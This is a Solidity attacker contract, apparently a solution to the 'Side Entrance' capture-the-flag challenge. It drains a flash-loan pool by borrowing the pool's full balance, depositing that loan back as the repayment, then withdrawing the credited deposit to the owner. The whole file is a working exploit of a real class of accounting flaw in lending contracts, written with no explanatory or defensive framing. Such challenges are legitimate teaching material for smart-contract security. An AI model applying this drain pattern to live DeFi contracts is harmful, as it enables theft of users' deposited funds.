// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable pool;

    address private immutable owner;

    constructor(address payable _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function exploit() external {
        require(msg.sender == owner, "niet");
        uint256 contractBalance = address(pool).balance;
        pool.flashLoan(contractBalance);
        pool.withdraw();
        (bool sent, ) = owner.call{value: contractBalance}("");
        require(sent, "not sent");
    }

    function execute() override external payable {
        pool.deposit{value: msg.value}();
    }

    fallback() external payable { }
}